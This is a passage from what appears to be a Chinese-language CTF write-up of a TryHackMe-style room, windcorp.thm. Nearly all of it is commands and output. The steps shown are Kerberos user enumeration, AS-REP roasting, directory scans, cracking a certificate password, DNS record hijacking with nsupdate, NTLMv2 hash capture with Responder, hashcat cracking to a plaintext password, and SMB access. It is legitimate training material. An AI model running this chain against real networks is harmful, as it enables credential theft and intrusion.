class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ namemash.py <span class="hljs-built_in">users</span> &gt; users.txt<br>$ kerbrute userenum -d windcorp.thm ./users --dc 10.10.75.95 -o user.txt<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 07/09/22 - Ronnie Flathers @ropnop<br><br>2022/07/09 21:24:39 &gt;  Using KDC(s):<br>2022/07/09 21:24:39 &gt;  10.10.75.95:88<br><br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: Emile@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: Edeltraut@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: happymeercat399@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: buse@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: brownostrich284@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: orangegorilla428@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: angrybird253@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: goldencat416@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: organicfish718@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: tinygoose102@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: sadswan869@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: kirkug@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: whiteleopard529@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: Emilieje@windcorp.thm<br>2022/07/09 21:24:40 &gt;  [+] VALID USERNAME: lilyle@windcorp.thm<br>2022/07/09 21:24:41 &gt;  Done! Tested 54 usernames (15 valid) <span class="hljs-keyword">in</span> 1.918 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> user.txt | grep <span class="hljs-string">&quot;[+]&quot;</span>| awk <span class="hljs-string">&#x27;&#123; print $7 &#125;&#x27;</span>|awk -F <span class="hljs-string">&quot;@&quot;</span> <span class="hljs-string">&#x27;&#123; print $1 &#125;&#x27;</span> &gt; users.txt<br>$ <span class="hljs-built_in">cat</span> users.txt <br>Emile<br>Edeltraut<br>happymeercat399<br>buse<br>brownostrich284<br>angrybird253<br>organicfish718<br>goldencat416<br>orangegorilla428<br>tinygoose102<br>sadswan869<br>kirkug<br>whiteleopard529<br>Emilieje<br>lilyle<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs BASH">$ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.75.95 <span class="hljs-string">&#x27;windcorp.thm/&#x27;</span> -usersfile ./users.txt <br>Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation<br><br>[-] User Emile doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User Edeltraut doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User happymeercat399 doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User buse doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User brownostrich284 doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User angrybird253 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User organicfish718 doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User goldencat416 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User orangegorilla428 doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User tinygoose102 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User sadswan869 doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User kirkug doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User whiteleopard529 doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User Emilieje doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User lilyle doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br></code></pre></td></tr></table></figure><p>并没有什么用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -e asp -u https://fire.windcorp.thm<br><br>Target: https://fire.windcorp.thm/<br><br>[21:45:29] Starting: <br>[21:45:31] 403 -  312B  - /%2e%2e//google.com<br>[21:45:57] 200 -    3KB - /Gulpfile.js<br>[21:46:00] 403 -    2KB - /Trace.axd<br>[21:46:03] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[21:46:22] 403 -    1KB - /aspnet_client/<br>[21:46:22] 301 -  163B  - /aspnet_client  -&gt;  https://fire.windcorp.thm/aspnet_client/<br>[21:46:34] 301 -  153B  - /css  -&gt;  https://fire.windcorp.thm/css/<br>[21:46:45] 200 -    3KB - /gulpfile.js<br>[21:46:47] 301 -  153B  - /img  -&gt;  https://fire.windcorp.thm/img/<br>[21:46:48] 200 -   12KB - /index.html<br>[21:46:50] 400 -    3KB - /jolokia/exec/java.lang:<span class="hljs-built_in">type</span>=Memory/gc<br>[21:46:50] 400 -    3KB - /jolokia/read/java.lang:<span class="hljs-built_in">type</span>=*/HeapMemoryUsage<br>[21:46:50] 400 -    3KB - /jolokia/read/java.lang:<span class="hljs-built_in">type</span>=Memory/HeapMemoryUsage/used<br>[21:46:50] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*<br>[21:46:50] 400 -    3KB - /jolokia/write/java.lang:<span class="hljs-built_in">type</span>=Memory/Verbose/true<br>[21:46:50] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/help/*<br>[21:46:50] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmSystemProperties<br>[21:46:50] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/jfrStart/filename=!/tmp!/foo<br>[21:46:50] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd<br>[21:46:50] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd<br>[21:46:50] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmLog/output=!/tmp!/pwned<br>[21:46:50] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmLog/disable<br>[21:47:05] 302 -  168B  - /powershell/  -&gt;  /powershell/default.aspx?ReturnUrl=%2fpowershell%2f<br>[21:47:21] 403 -    1KB - /vendor/<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220709214947774.png" alt="image-20220709214947774"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220709215022527.png" alt="image-20220709215022527"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220709215102497.png" alt="image-20220709215102497"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220709215210095.png" alt="image-20220709215210095"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -u https://selfservice.dev.windcorp.thm/ -e aspx<br>Target: https://selfservice.dev.windcorp.thm/<br><br>[21:52:50] Starting: <br>[21:52:52] 403 -  312B  - /%2e%2e//google.com<br>[21:53:16] 200 -  365B  - /Backup/<br>[21:53:21] 403 -    2KB - /Trace.axd<br>[21:53:23] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[21:53:37] 301 -  174B  - /aspnet_client  -&gt;  https://selfservice.dev.windcorp.thm/aspnet_client/<br>[21:53:37] 403 -    1KB - /aspnet_client/<br>[21:53:38] 301 -  167B  - /backup  -&gt;  https://selfservice.dev.windcorp.thm/backup/<br>[21:53:39] 200 -  365B  - /backup/<br>[21:54:05] 200 -  106B  - /index.html<br>[21:54:08] 400 -    3KB - /jolokia/exec/java.lang:<span class="hljs-built_in">type</span>=Memory/gc<br>[21:54:08] 400 -    3KB - /jolokia/read/java.lang:<span class="hljs-built_in">type</span>=*/HeapMemoryUsage<br>[21:54:08] 400 -    3KB - /jolokia/read/java.lang:<span class="hljs-built_in">type</span>=Memory/HeapMemoryUsage/used<br>[21:54:08] 400 -    3KB - /jolokia/write/java.lang:<span class="hljs-built_in">type</span>=Memory/Verbose/true<br>[21:54:08] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*<br>[21:54:08] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmSystemProperties<br>[21:54:08] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/jfrStart/filename=!/tmp!/foo<br>[21:54:08] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/help/*<br>[21:54:08] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmLog/output=!/tmp!/pwned<br>[21:54:08] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd<br>[21:54:08] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd<br>[21:54:08] 400 -    3KB - /jolokia/exec/com.sun.management:<span class="hljs-built_in">type</span>=DiagnosticCommand/vmLog/disable<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220709215522699.png" alt="image-20220709215522699"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ openssl pkcs12 -info -<span class="hljs-keyword">in</span> cert.pfx <br>Enter Import Password:<br>Can<span class="hljs-string">&#x27;t read Password</span><br><span class="hljs-string">$ crackpkcs12 -d /usr/share/wordlists/rockyou.txt cert.pfx </span><br><span class="hljs-string"></span><br><span class="hljs-string">Dictionary attack - Starting 8 threads</span><br><span class="hljs-string"></span><br><span class="hljs-string">*********************************************************</span><br><span class="hljs-string">Dictionary attack - Thread 4 - Password found: ganteng</span><br><span class="hljs-string">*********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ openssl pkcs12 -in cert.pfx -nocerts -out private.pem -nodes</span><br><span class="hljs-string">Enter Import Password:</span><br><span class="hljs-string">$ openssl pkcs12 -in cert.pfx -out public.pem -clcerts -nokeys</span><br><span class="hljs-string">Enter Import Password:</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">private.pem  public.pem</span><br><span class="hljs-string">$ cp *.pem /usr/share/responder/cert</span><br><span class="hljs-string">$ sudo vim /usr/share/responder/Responder.conf</span><br><span class="hljs-string">; Configure SSL Certificates to use</span><br><span class="hljs-string">SSLCert = certs/public.pem</span><br><span class="hljs-string">SSLKey = certs/private.pem</span><br></code></pre></td></tr></table></figure><p>更新DNS记录，将其指向自己的attack盒子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nsupdate <br>&gt; server 10.10.173.196<br>&gt; update delete selfservice.windcorp.thm<br>&gt; send<br>&gt; update add selfservice.windcorp.thm 1234 A 10.11.75.230<br>&gt; send<br>&gt; quit<br>$ dig selfservice.windcorp.thm @10.10.173.196<br><br>; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; selfservice.windcorp.thm @10.10.173.196<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 3164</span><br><span class="hljs-string">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;selfservice.windcorp.thm.INA</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">selfservice.windcorp.thm. 1234INA10.11.75.230</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 283 msec</span><br><span class="hljs-string">;; SERVER: 10.10.173.196#53(10.10.173.196)</span><br><span class="hljs-string">;; WHEN: Sun Jul 10 10:02:09 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 6</span><br></code></pre></td></tr></table></figure><p>开启嗅探，点击目标首页右上角的按钮：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo responder -I tun0<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br><br><br>[+] Poisoners:<br>    LLMNR                      [ON]<br>    NBT-NS                     [ON]<br>    DNS/MDNS                   [ON]<br><br>[+] Servers:<br>    HTTP server                [ON]<br>    HTTPS server               [ON]<br>    WPAD proxy                 [OFF]<br>    Auth proxy                 [OFF]<br>    SMB server                 [ON]<br>    Kerberos server            [ON]<br>    SQL server                 [ON]<br>    FTP server                 [ON]<br>    IMAP server                [ON]<br>    POP3 server                [ON]<br>    SMTP server                [ON]<br>    DNS server                 [ON]<br>    LDAP server                [ON]<br>    RDP server                 [ON]<br>    DCE-RPC server             [ON]<br>    WinRM server               [ON]<br><br>[+] HTTP Options:<br>    Always serving EXE         [OFF]<br>    Serving EXE                [OFF]<br>    Serving HTML               [OFF]<br>    Upstream Proxy             [OFF]<br><br>[+] Poisoning Options:<br>    Analyze Mode               [OFF]<br>    Force WPAD auth            [OFF]<br>    Force Basic Auth           [OFF]<br>    Force LM downgrade         [OFF]<br>    Fingerprint hosts          [OFF]<br><br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [10.11.75.230]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don<span class="hljs-string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Current Session Variables:</span><br><span class="hljs-string">    Responder Machine Name     [WIN-MA5PEXZUI25]</span><br><span class="hljs-string">    Responder Domain Name      [MXY0.LOCAL]</span><br><span class="hljs-string">    Responder DCE-RPC Port     [48613]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Listening for events...</span><br><span class="hljs-string"></span><br><span class="hljs-string">[HTTP] NTLMv2 Client   : 10.10.173.196</span><br><span class="hljs-string">[HTTP] NTLMv2 Username : WINDCORP\edwardle</span><br><span class="hljs-string">[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:a444950de1bdee52:C3A10CF264CD80613C4B2F719016E71C:01010000000000002557682E0194D801B1B0B96A141B3D8A00000000020008004D0058005900300001001E00570049004E002D004D00410035005000450058005A005500490032003500040014004D005800590030002E004C004F00430041004C0003003400570049004E002D004D00410035005000450058005A0055004900320035002E004D005800590030002E004C004F00430041004C00050014004D005800590030002E004C004F00430041004C000800300030000000000000000100000000200000C103AED93EEA075D878367EDCA71CFFC2D85996A87480704011EF28CFC8438B40A00100012C690EF73A24A276DC3EDC54B8CC48409003A0048005400540050002F00730065006C00660073006500720076006900630065002E00770069006E00640063006F00720070002E00740068006D000000000000000000</span><br><span class="hljs-string">[*] Skipping previously captured hash for WINDCORP\edwardle</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$ hashcat -m <span class="hljs-number">5600</span> hash /usr/share/wordlists/rockyou.txt<br>EDWARDLE::WINDCORP:a<span class="hljs-number">444950</span>de<span class="hljs-number">1</span>bdee<span class="hljs-number">52</span>:<span class="hljs-keyword">c</span><span class="hljs-number">3</span>a<span class="hljs-number">10</span>cf<span class="hljs-number">264</span>cd<span class="hljs-number">80613</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">2</span>f<span class="hljs-number">719016e71</span><span class="hljs-keyword">c</span>:<span class="hljs-number">01010000000000002557682e0194</span>d<span class="hljs-number">801</span>b<span class="hljs-number">1</span>b<span class="hljs-number">0</span>b<span class="hljs-number">96</span>a<span class="hljs-number">141</span>b<span class="hljs-number">3</span>d<span class="hljs-number">8</span>a<span class="hljs-number">00000000020008004</span>d<span class="hljs-number">0058005900300001001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">004</span>d<span class="hljs-number">00410035005000450058005</span>a<span class="hljs-number">005500490032003500040014004</span>d<span class="hljs-number">005800590030002e004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span>f<span class="hljs-number">00430041004</span><span class="hljs-keyword">c</span><span class="hljs-number">0003003400570049004e002</span>d<span class="hljs-number">004</span>d<span class="hljs-number">00410035005000450058005</span>a<span class="hljs-number">0055004900320035002e004</span>d<span class="hljs-number">005800590030002e004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span>f<span class="hljs-number">00430041004</span><span class="hljs-keyword">c</span><span class="hljs-number">00050014004</span>d<span class="hljs-number">005800590030002e004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span>f<span class="hljs-number">00430041004</span><span class="hljs-keyword">c</span><span class="hljs-number">000800300030000000000000000100000000200000</span><span class="hljs-keyword">c</span><span class="hljs-number">103</span>aed<span class="hljs-number">93</span>eea<span class="hljs-number">075</span>d<span class="hljs-number">878367</span>edca<span class="hljs-number">71</span>cffc<span class="hljs-number">2</span>d<span class="hljs-number">85996</span>a<span class="hljs-number">87480704011</span>ef<span class="hljs-number">28</span>cfc<span class="hljs-number">8438</span>b<span class="hljs-number">40</span>a<span class="hljs-number">00100012</span><span class="hljs-keyword">c</span><span class="hljs-number">690</span>ef<span class="hljs-number">73</span>a<span class="hljs-number">24</span>a<span class="hljs-number">276</span>dc<span class="hljs-number">3</span>edc<span class="hljs-number">54</span>b<span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">48409003</span>a<span class="hljs-number">0048005400540050002</span>f<span class="hljs-number">00730065006</span><span class="hljs-keyword">c</span><span class="hljs-number">00660073006500720076006900630065002e00770069006</span>e<span class="hljs-number">00640063006</span>f<span class="hljs-number">00720070002e00740068006</span>d<span class="hljs-number">000000000000000000</span>:<span class="hljs-title">!Angelus25</span>!<br></code></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">edwardle:!Angelus25!<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.173</span><span class="hljs-number">.196</span> -u edwardle -p <span class="hljs-string">&#x27;!Angelus25!&#x27;</span><br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.173</span><span class="hljs-number">.196</span>:<span class="hljs-number">445</span><span class="hljs-type">Name</span>: windcorp.thm                                      <br>        Disk                                                  Permissions<span class="hljs-keyword">Comment</span><br><span class="hljs-comment">----                                                  ------------------</span><br><span class="hljs-keyword">ADMIN</span>$                                            <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>Remote <span class="hljs-keyword">Admin</span><br>C$                                                <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span><span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>IPC$                                              <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>Remote IPC<br>NETLOGON                                          <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>Shared                                            <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br>SYSVOL                                            <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>Users                                             <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br></code></pre></td></tr></table></figure><p>共享中没什么东西，可以到之前发现了powershell中登录。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220710101459456.png" alt="image-20220710101459456"></p><h6 id="Flag3-txt"><a href="#Flag3-txt" class="headerlink" title="Flag3.txt:"></a>Flag3.txt:</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 